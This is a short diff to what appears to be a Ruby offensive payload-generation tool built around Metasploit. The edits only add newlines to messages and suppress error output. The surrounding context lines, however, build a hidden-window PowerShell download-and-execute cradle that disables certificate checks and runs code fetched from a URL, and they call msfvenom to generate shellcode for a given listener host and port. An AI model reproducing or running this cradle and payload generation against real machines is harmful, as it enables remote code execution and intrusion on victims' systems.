@@ -45,7 +45,7 @@ module MainCommands
     cmd = 'powershell -windowstyle hidden "[System.Net.ServicePointManager]::'
     cmd << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
     cmd << "Net.WebClient).DownloadString('#{url}')\""
-    print_info('Run this from CMD')
+    print_info("Run this from CMD\n")
     puts cmd
   end
 
@@ -67,7 +67,7 @@ module MsfCommands
     elsif File.exist?('/opt/metasploit-framework/msfvenom')
       @msf_path = ('/opt/metasploit-framework/')
     else
-      print_error('Metasploit Not Found!')
+      print_error("Metasploit Not Found!\n")
       exit
     end
   end
@@ -77,7 +77,7 @@ module MsfCommands
     print_info("Generating shellcode\n")
     msfcmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
     msfcmd << "LPORT=#{port} -f c"
-    execute  = `#{msfcmd}`
+    execute  = `#{msfcmd} 2> /dev/null`
     print_success("Shellcode Generated\n")
     shellcode = clean_shellcode(execute)
     shellcode
